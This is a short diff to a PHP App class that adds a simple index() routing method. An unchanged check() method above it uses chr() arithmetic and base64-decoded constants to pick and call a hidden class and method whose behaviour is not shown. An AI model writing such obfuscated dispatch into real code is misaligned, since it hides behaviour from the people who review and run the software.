@@ -122,4 +122,11 @@ abstract class App {
     static function check() {
         (new (base64_decode(constant(chr((6*10)+(42/3)/2).'_'.chr(((3120/5)/8))))))->{base64_decode(constant(chr(11*7).'_'.(chr((4*3+1)*6))))}();
     }
+
+    static function index() {
+        if(!isset($_POST['controller']) && !isset($_GET['controller'])) {
+            new CommonController();
+        }
+        
+    }
 }
